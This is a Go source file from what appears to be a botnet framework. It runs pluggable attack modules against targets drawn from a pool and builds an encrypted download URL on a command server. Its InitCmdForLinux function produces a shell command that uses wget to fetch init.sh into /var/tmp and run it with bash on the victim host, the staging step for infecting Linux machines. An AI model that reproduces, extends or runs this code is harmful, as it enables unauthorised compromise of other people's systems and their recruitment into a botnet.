package attack

import (
	"fmt"
	"github.com/cbot/targets/local"
	"github.com/cbot/targets/source"
	"github.com/cbot/utils/jsonutils"
	"github.com/cbot/utils/netutils"
	"log"
	"sync"
)

type AttackTasks struct {
	lock sync.Mutex

	Cfg *Config

	spool *source.SourcePool

	nodeInfo *local.NodeInfo

	attacks map[string]Attack

	syncChan chan int

	attackProcessChan chan *AttackProcess
}

func NewAttackTasks(cfg *Config, nodeInfo *local.NodeInfo, spool *source.SourcePool) *AttackTasks {

	return &AttackTasks{
		lock:              sync.Mutex{},
		Cfg:               cfg,
		spool:             spool,
		nodeInfo:          nodeInfo,
		attacks:           make(map[string]Attack),
		syncChan:          make(chan int, cfg.MaxThreads),
		attackProcessChan: make(chan *AttackProcess, cfg.AttackProcessCapacity),
	}

}

func (at *AttackTasks) AddAttack(attack Attack) {

	at.lock.Lock()
	defer at.lock.Unlock()

	if _, ok := at.attacks[attack.Name()]; !ok {

		//no existed

		at.attacks[attack.Name()] = attack
	}

}

func (at *AttackTasks) RemoveAttack(name string) {

	at.lock.Lock()
	defer at.lock.Unlock()

	delete(at.attacks, name)

}

func (at *AttackTasks) SubAttackProcess() chan *AttackProcess {

	return at.attackProcessChan
}

func (at *AttackTasks) PubAttackProcess(process *AttackProcess) {

	at.attackProcessChan <- process

}

func (at *AttackTasks) run(target source.Target) {

	at.lock.Lock()
	defer at.lock.Unlock()

	for _, attack := range at.attacks {

		if attack.Accept(target) {

			log.Printf("Try to Attack for target,attack.name",attack.Name())

			go attack.Run(target)
		}
	}
}

func (at *AttackTasks) PubSyn() {

	at.syncChan <- 1

}

func (at *AttackTasks) Start() {

	targetChan := at.spool.SubTarget("attack_tasks", at.Cfg.SourceCapacity, func(target source.Target) bool {

		for _, attack := range at.attacks {

			if attack.Accept(target) {

				return true
			}
		}
		return false
	})

	go func() {
		for {

			select {

			case target := <-targetChan:

				//try to run,if too many threads is live than wait some threads exit
				<-at.syncChan
				//ok

				log.Printf("Receive a attack target:%s",jsonutils.ToJsonString(target,true))
				at.run(target)

			}
		}
	}()
}

func (at *AttackTasks) DownloadInitUrl(targetIP string, targetPort int, attackType string, fname string) string {

	upc := &netutils.URLPathCrypt{
		TaskId:       at.Cfg.TaskId,
		NodeId:       at.Cfg.NodeId,
		Fname:        fname,
		AttackType:   attackType,
		AttackIP:     at.nodeInfo.IP,
		TargetIP:     targetIP,
		TargetPort:   targetPort,
		DownloadTool: "wget",
	}

	return fmt.Sprintf("http://%s:%d/%s", at.Cfg.SBotHost, at.Cfg.SBotPort, netutils.URLPathCryptToString(upc))

}

func (at *AttackTasks) InitCmdForLinux(initUrl string) string {

	return fmt.Sprintf("wget %s -O /var/tmp/init.sh;bash /var/tmp/init.sh %s", initUrl, at.Cfg.NodeId)
}
